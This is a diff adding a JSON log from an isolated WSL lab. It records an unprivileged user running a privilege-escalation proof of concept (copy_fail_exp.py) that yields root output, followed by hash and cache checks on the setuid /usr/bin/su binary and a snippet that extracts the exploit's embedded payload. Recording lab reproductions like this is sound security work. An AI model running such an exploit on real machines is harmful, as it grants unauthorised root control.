@@ -1,0 +1,213 @@
+[
+  {
+    "label": "original_poc",
+    "started_utc": "2026-11-23T15:02:59.497317+00:00",
+    "command": [
+      "C:\\Windows\\System32\\wsl.exe",
+      "-d",
+      "CopyFailLab-20261123",
+      "-u",
+      "copyfailtest",
+      "--cd",
+      "/home/copyfailtest",
+      "--",
+      "timeout",
+      "-k",
+      "5s",
+      "45s",
+      "python3",
+      "/home/copyfailtest/copy_fail_exp.py"
+    ],
+    "stdin": "id\nwhoami\nexit\n",
+    "exit_code": 0,
+    "stdout": "",
+    "stderr": ": 1: id\n: not found\n: 2: whoami\n: not found\n: 3: exit\n: not found\n"
+  },
+  {
+    "label": "identity_after_unprivileged_process",
+    "started_utc": "2026-11-23T15:02:59.775216+00:00",
+    "command": [
+      "C:\\Windows\\System32\\wsl.exe",
+      "-d",
+      "CopyFailLab-20261123",
+      "-u",
+      "copyfailtest",
+      "--cd",
+      "/home/copyfailtest",
+      "--",
+      "python3",
+      "-c",
+      "import os; print(f\"uid={os.getuid()} euid={os.geteuid()} gid={os.getgid()}\")"
+    ],
+    "stdin": null,
+    "exit_code": 0,
+    "stdout": "uid=1001 euid=1001 gid=1002\n",
+    "stderr": ""
+  },
+  {
+    "label": "su_sha256_after_cached_read",
+    "started_utc": "2026-11-23T15:02:59.867830+00:00",
+    "command": [
+      "C:\\Windows\\System32\\wsl.exe",
+      "-d",
+      "CopyFailLab-20261123",
+      "-u",
+      "root",
+      "--cd",
+      "/home/copyfailtest",
+      "--",
+      "sha256sum",
+      "/usr/bin/su"
+    ],
+    "stdin": null,
+    "exit_code": 0,
+    "stdout": "2a053f828cffc79d15a4bbf6b560a17bb54fc5331102f866fe68f73baff655f1  /usr/bin/su\n",
+    "stderr": ""
+  },
+  {
+    "label": "su_direct_first4k_after",
+    "started_utc": "2026-11-23T15:02:59.948077+00:00",
+    "command": [
+      "C:\\Windows\\System32\\wsl.exe",
+      "-d",
+      "CopyFailLab-20261123",
+      "-u",
+      "root",
+      "--cd",
+      "/home/copyfailtest",
+      "--",
+      "sh",
+      "-lc",
+      "dd if=/usr/bin/su iflag=direct bs=4096 count=1 status=none | sha256sum"
+    ],
+    "stdin": null,
+    "exit_code": 0,
+    "stdout": "4ec7a4ea956876e40e25997260fd2f72f8d98318dbecc5225adb8489c5a29d03  -\n",
+    "stderr": ""
+  },
+  {
+    "label": "su_metadata_after",
+    "started_utc": "2026-11-23T15:03:00.031901+00:00",
+    "command": [
+      "C:\\Windows\\System32\\wsl.exe",
+      "-d",
+      "CopyFailLab-20261123",
+      "-u",
+      "root",
+      "--cd",
+      "/home/copyfailtest",
+      "--",
+      "stat",
+      "-c",
+      "%n %a %u:%g %s bytes",
+      "/usr/bin/su"
+    ],
+    "stdin": null,
+    "exit_code": 0,
+    "stdout": "/usr/bin/su 4755 0:0 55680 bytes\n",
+    "stderr": ""
+  },
+  {
+    "label": "original_poc_lf_stdin",
+    "started_utc": "2026-11-23T15:03:28.360598+00:00",
+    "command": [
+      "C:\\Windows\\System32\\wsl.exe",
+      "-d",
+      "CopyFailLab-20261123",
+      "-u",
+      "copyfailtest",
+      "--cd",
+      "/home/copyfailtest",
+      "--",
+      "timeout",
+      "-k",
+      "5s",
+      "45s",
+      "python3",
+      "/home/copyfailtest/copy_fail_exp.py"
+    ],
+    "stdin_escaped": "id\\nwhoami\\nexit\\n (LF bytes)",
+    "exit_code": 0,
+    "stdout": "uid=0(root) gid=1002(copyfailtest) groups=1002(copyfailtest)\nroot\n",
+    "stderr": ""
+  },
+  {
+    "label": "su_sha256_after_root_shell",
+    "started_utc": "2026-11-23T15:04:13.965650+00:00",
+    "command": [
+      "C:\\Windows\\System32\\wsl.exe",
+      "-d",
+      "CopyFailLab-20261123",
+      "-u",
+      "copyfailtest",
+      "--cd",
+      "/home/copyfailtest",
+      "--",
+      "sha256sum",
+      "/usr/bin/su"
+    ],
+    "exit_code": 0,
+    "stdout": "4264819999f1724767c2f114d434e6b047a0b72122d20a1ffe7240d038219037  /usr/bin/su\n",
+    "stderr": ""
+  },
+  {
+    "label": "su_direct_first4k_after_root_shell",
+    "started_utc": "2026-11-23T15:04:14.059952+00:00",
+    "command": [
+      "C:\\Windows\\System32\\wsl.exe",
+      "-d",
+      "CopyFailLab-20261123",
+      "-u",
+      "root",
+      "--cd",
+      "/home/copyfailtest",
+      "--",
+      "sh",
+      "-lc",
+      "dd if=/usr/bin/su iflag=direct bs=4096 count=1 status=none | sha256sum"
+    ],
+    "exit_code": 0,
+    "stdout": "4ec7a4ea956876e40e25997260fd2f72f8d98318dbecc5225adb8489c5a29d03  -\n",
+    "stderr": ""
+  },
+  {
+    "label": "payload_cache_comparison",
+    "started_utc": "2026-11-23T15:04:14.161466+00:00",
+    "command": [
+      "C:\\Windows\\System32\\wsl.exe",
+      "-d",
+      "CopyFailLab-20261123",
+      "-u",
+      "copyfailtest",
+      "--cd",
+      "/home/copyfailtest",
+      "--",
+      "python3",
+      "-c",
+      "import pathlib, zlib\nsource = pathlib.Path('/home/copyfailtest/copy_fail_exp.py').read_text()\nblob = source.split('zlib.decompress(d(\"',1)[1].split('\"))',1)[0]\nexpected = zlib.decompress(bytes.fromhex(blob))\nobserved = pathlib.Path('/usr/bin/su').read_bytes()[:len(expected)]\nprint('payload_length=', len(expected))\nprint('cached_first_160_equals_payload=', observed == expected)\nprint('cached_first_16=', observed[:16].hex())\n"
+    ],
+    "exit_code": 0,
+    "stdout": "payload_length= 160\ncached_first_160_equals_payload= False\ncached_first_16= 7f454c46020101000000000000000000\n",
+    "stderr": ""
+  },
+  {
+    "label": "identity_after_root_shell_exited",
+    "started_utc": "2026-11-23T15:04:14.241947+00:00",
+    "command": [
+      "C:\\Windows\\System32\\wsl.exe",
+      "-d",
+      "CopyFailLab-20261123",
+      "-u",
+      "copyfailtest",
+      "--cd",
+      "/home/copyfailtest",
+      "--",
+      "python3",
+      "-c",
+      "import os; print(f\"uid={os.getuid()} euid={os.geteuid()}\")"
+    ],
+    "exit_code": 0,
+    "stdout": "uid=1001 euid=1001\n",
+    "stderr": ""
+  }
+]
